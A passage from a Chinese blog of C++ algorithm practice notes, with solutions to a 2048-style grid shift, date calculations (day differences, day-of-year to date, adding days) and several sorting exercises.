class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span>&#123;</span><br><span class="line">									tmp[idx++] = s[j][i];</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>(jud)&#123;</span><br><span class="line">								tmp[idx++] = s[j][i];</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span>&#123;</span><br><span class="line">							tmp[idx++] = s[j][i];</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">					s[j][i] = tmp[<span class="number">3</span>-j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">3</span>)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">				<span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">					<span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(j!=<span class="number">3</span>)&#123;</span><br><span class="line">							<span class="type">int</span> jud = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">for</span>(<span class="type">int</span> k = j + <span class="number">1</span>; k &lt; <span class="number">4</span>; k++)&#123;</span><br><span class="line">								<span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">								<span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">									tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">									j = k;</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span>&#123;</span><br><span class="line">									tmp[idx++] = s[i][j];</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>(jud)&#123;</span><br><span class="line">								tmp[idx++] = s[i][j];</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span>&#123;</span><br><span class="line">							tmp[idx++] = s[i][j];</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">					s[i][j] = tmp[j];</span><br><span class="line">				&#125;</span><br><span class="line"></span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span> <span class="keyword">if</span>(n == <span class="number">4</span>)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">				<span class="type">int</span> tmp[<span class="number">4</span>] = &#123;<span class="number">0</span>&#125;, idx = <span class="number">0</span>;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">					<span class="keyword">if</span>(s[i][j] != <span class="number">0</span>)&#123;</span><br><span class="line">						<span class="keyword">if</span>(j != <span class="number">0</span>)&#123;</span><br><span class="line">							<span class="type">int</span> jud = <span class="number">1</span>;</span><br><span class="line">							<span class="keyword">for</span>(<span class="type">int</span> k = j - <span class="number">1</span>; k &gt;= <span class="number">0</span>; k--)&#123;</span><br><span class="line">								<span class="keyword">if</span>(s[i][k] == <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">								<span class="keyword">if</span>(s[i][j] == s[i][k])&#123;</span><br><span class="line">									tmp[idx++] = <span class="number">2</span> * s[i][j];</span><br><span class="line">									j = k;</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">								<span class="keyword">else</span>&#123;</span><br><span class="line">									tmp[idx++] = s[i][j];</span><br><span class="line">									jud = <span class="number">0</span>;</span><br><span class="line">									<span class="keyword">break</span>;</span><br><span class="line">								&#125;</span><br><span class="line">							&#125;</span><br><span class="line">							<span class="keyword">if</span>(jud)&#123;</span><br><span class="line">								tmp[idx++] = s[i][j];</span><br><span class="line">							&#125;</span><br><span class="line">						&#125;</span><br><span class="line">						<span class="keyword">else</span>&#123;</span><br><span class="line">							tmp[idx++] = s[i][j];</span><br><span class="line">						&#125;</span><br><span class="line">					&#125;</span><br><span class="line">				&#125;</span><br><span class="line">				<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">3</span>; j &gt;= <span class="number">0</span>; j--)&#123;</span><br><span class="line">					s[i][j] = tmp[<span class="number">3</span>-j];</span><br><span class="line">				&#125;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> j = <span class="number">0</span>; j &lt; <span class="number">4</span>; j++)&#123;</span><br><span class="line">				cout &lt;&lt; s[i][j] &lt;&lt; <span class="string">&quot; &quot;</span>; </span><br><span class="line">			&#125;</span><br><span class="line">			cout &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="日期">日期</h2>
<h3 id="日期差值">日期差值</h3>
<p>同一年用一个函数来写；</p>
<p>不同年的拆成三部分，第一年数据到年底、中间、第二年年初到数据</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">data</span>&#123;</span><br><span class="line">	<span class="type">int</span> year, month, day;</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">cal_days</span><span class="params">(<span class="keyword">struct</span> data d1, <span class="keyword">struct</span> data d2)</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">	<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">	<span class="keyword">if</span>(d1.month == d2.month) ans = d2.day - d1.day + <span class="number">1</span>;</span><br><span class="line">	<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">is_lunar</span>(d1.year))&#123;</span><br><span class="line">			f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		f[d1.month] -= d1.day;</span><br><span class="line">		ans = d2.day + <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = d1.month; i &lt; d2.month; i++)&#123;</span><br><span class="line">			ans += f[i];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> ans;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">char</span> r1[<span class="number">10</span>], r2[<span class="number">10</span>];</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; r1 &gt;&gt; r2)&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">data</span> d1, d2;</span><br><span class="line">		d1.year = (r1[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r1[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r1[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		d1.month = (r1[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		d1.day = (r1[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r1[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		d2.year = (r2[<span class="number">0</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">1000</span> + (r2[<span class="number">1</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">100</span> + (r2[<span class="number">2</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">3</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		d2.month = (r2[<span class="number">4</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">5</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">		d2.day = (r2[<span class="number">6</span>]-<span class="string">&#x27;0&#x27;</span>) * <span class="number">10</span> + (r2[<span class="number">7</span>]-<span class="string">&#x27;0&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; d1.year &lt;&lt; &quot;-&quot; &lt;&lt; d1.month &lt;&lt; &quot;-&quot; &lt;&lt; d1.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; d2.year &lt;&lt; &quot;-&quot; &lt;&lt; d2.month &lt;&lt; &quot;-&quot; &lt;&lt; d2.day &lt;&lt; endl;</span></span><br><span class="line"><span class="comment">//		cout &lt;&lt; &quot;-----------&quot; &lt;&lt; endl;</span></span><br><span class="line"></span><br><span class="line">		<span class="type">int</span> ans = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">if</span>(d1.year == d2.year)&#123;</span><br><span class="line">			ans = <span class="built_in">cal_days</span>(d1, d2);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="keyword">struct</span> data d3 = &#123;</span><br><span class="line">				d1.year,</span><br><span class="line">				<span class="number">12</span>,</span><br><span class="line">				<span class="number">31</span></span><br><span class="line">			&#125;;</span><br><span class="line">			ans += <span class="built_in">cal_days</span>(d1, d3);</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span>(<span class="type">int</span> i = d1.year+<span class="number">1</span>; i &lt; d2.year; i++)&#123;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">is_lunar</span>(i)) ans += <span class="number">366</span>;</span><br><span class="line">				<span class="keyword">else</span> ans += <span class="number">365</span>;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">struct</span> <span class="title class_">data</span> d4 = &#123;</span><br><span class="line">				d2.year,</span><br><span class="line">				<span class="number">1</span>,</span><br><span class="line">				<span class="number">1</span></span><br><span class="line">			&#125;;</span><br><span class="line">			ans += <span class="built_in">cal_days</span>(d4, d2);</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="打印日期">打印日期</h3>
<p>格式化输出啥的</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> y, d;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; y &gt;&gt; d)&#123;</span><br><span class="line">		<span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">		<span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">		<span class="type">int</span> ans = <span class="number">1</span>, i = <span class="number">1</span>;</span><br><span class="line">		<span class="keyword">while</span>(d &gt; f[i])&#123;</span><br><span class="line">			d -= f[i];</span><br><span class="line">			i++;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, i, d);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="日期累加">日期累加</h3>
<p>设计一个程序能计算一个日期加上若干天后是什么日期。</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">is_lunar</span><span class="params">(<span class="type">int</span> y)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(y%<span class="number">400</span>==<span class="number">0</span> || (y%<span class="number">4</span>==<span class="number">0</span> &amp;&amp; y%<span class="number">100</span>!=<span class="number">0</span>)) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">	<span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> m;</span><br><span class="line">	cin &gt;&gt; m;</span><br><span class="line">	<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; m; i++)&#123;</span><br><span class="line">		<span class="type">int</span> y, m, d, n;</span><br><span class="line">		cin &gt;&gt; y &gt;&gt; m &gt;&gt; d &gt;&gt; n;</span><br><span class="line">		d += n;</span><br><span class="line">		<span class="type">int</span> f[<span class="number">13</span>] = &#123;<span class="number">0</span>, <span class="number">31</span>, <span class="number">28</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>, <span class="number">30</span>, <span class="number">31</span>&#125;;</span><br><span class="line">		<span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">		<span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">		<span class="type">int</span> y_ = y;</span><br><span class="line">		<span class="keyword">while</span>(d &gt; f[m])&#123;</span><br><span class="line">			d -= f[m];</span><br><span class="line">			m ++;</span><br><span class="line">			<span class="keyword">if</span>(m &gt; <span class="number">12</span>)&#123;</span><br><span class="line">				m -= <span class="number">12</span>;</span><br><span class="line">				y ++;</span><br><span class="line">			&#125;</span><br><span class="line">			<span class="keyword">if</span>(y_ != y)&#123;</span><br><span class="line">				y_ = y;</span><br><span class="line">				<span class="keyword">if</span>(<span class="built_in">is_lunar</span>(y)) f[<span class="number">2</span>] = <span class="number">29</span>;</span><br><span class="line">				<span class="keyword">else</span> f[<span class="number">2</span>] = <span class="number">28</span>;</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%d-%02d-%02d\n&quot;</span>, y, m, d);</span><br><span class="line"></span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h2 id="排序-1">排序</h2>
<p>sort和stable_sort</p>
<p><img src="../images/%E7%AE%97%E6%B3%95%E5%88%B7%E9%A2%98%E8%AE%B0%E5%BD%95/image-20230613121222002.png" alt="image-20230613121222002"></p>
<h3 id="成绩排序">成绩排序</h3>
<p>题目：输入任意（用户，成绩）序列，可以获得成绩从高到低或从低到高的排列,相同成绩都按先录入排列在前的规则处理。</p>
<p>两种办法：</p>
<ol type="1">
<li><p>用stable_sort</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> grade;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">desc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">asc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, order;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">student</span> stu[<span class="number">100</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">stable_sort</span>(stu, stu+n, desc);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">stable_sort</span>(stu, stu+n, asc);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
<li><p>二级排序</p>
<p>设置一个id，成绩相同id小的在上</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">student</span>&#123;</span><br><span class="line">	string name;</span><br><span class="line">	<span class="type">int</span> grade, id;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">desc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line">	<span class="keyword">return</span> s1.grade &gt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">asc</span><span class="params">(<span class="keyword">struct</span> student s1, <span class="keyword">struct</span> student s2)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(s1.grade == s2.grade) <span class="keyword">return</span> s1.id &lt; s2.id;</span><br><span class="line">	<span class="keyword">return</span> s1.grade &lt; s2.grade;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n, order;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n &gt;&gt; order)&#123;</span><br><span class="line">		<span class="keyword">struct</span> <span class="title class_">student</span> stu[<span class="number">1000</span>];</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; stu[i].name &gt;&gt; stu[i].grade;</span><br><span class="line">			stu[i].id = i;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(order == <span class="number">0</span>)&#123;</span><br><span class="line">			<span class="built_in">sort</span>(stu, stu+n, desc);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">else</span>&#123;</span><br><span class="line">			<span class="built_in">sort</span>(stu, stu+n, asc);</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cout &lt;&lt; stu[i].name &lt;&lt; <span class="string">&quot; &quot;</span> &lt;&lt; stu[i].grade &lt;&lt; endl;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li>
</ol>
<h3 id="排序-2">排序</h3>
<p>输入n个数进行排序，要求先按奇偶后按从小到大的顺序排序。</p>
<p>也有两种办法，一个是奇偶分开排，一个是二级排序，把奇数排在偶数前面；</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="type">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, odd[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;, even[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; m[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="type">int</span> idx1 = <span class="number">0</span>, idx2 = <span class="number">0</span>;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			<span class="keyword">if</span>(m[i] % <span class="number">2</span> == <span class="number">0</span>) even[idx1++] = m[i];</span><br><span class="line">			<span class="keyword">else</span> odd[idx2++] = m[i]; </span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort</span>(odd, odd+idx2);</span><br><span class="line">		<span class="built_in">sort</span>(even, even+idx1);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx2; i++)&#123;</span><br><span class="line">			cout &lt;&lt; odd[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; idx1; i++)&#123;</span><br><span class="line">			cout &lt;&lt; even[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>分级：</p>
<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">compare</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span></span>&#123;</span><br><span class="line">	<span class="keyword">if</span>(a % <span class="number">2</span> == b % <span class="number">2</span>) <span class="keyword">return</span> a &lt; b;</span><br><span class="line">	<span class="keyword">else</span> <span class="built_in">return</span> (a%<span class="number">2</span>) &gt; (b%<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> n;</span><br><span class="line">	<span class="keyword">while</span>(cin &gt;&gt; n)&#123;</span><br><span class="line">		<span class="type">int</span> m[<span class="number">1000</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cin &gt;&gt; m[i];</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="built_in">sort</span>(m, m+n, compare);</span><br><span class="line">		<span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">			cout &lt;&lt; m[i] &lt;&lt; <span class="string">&quot; &quot;</span>;</span><br><span class="line">		&#125;</span><br><span class="line"></span><br><span class="line">		cout &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="排序2">排序2</h3>
<p>编写程序实现直接插入排序、希尔排序（d=5)、直接选择排序、快速排序和二路归并排序算法。</p>
<p>直接插入排序后的结果 一趟希尔排序后的结果 直接选择排序后的结果
快速排序后的结果 一趟二路归并排序后的结果</p>
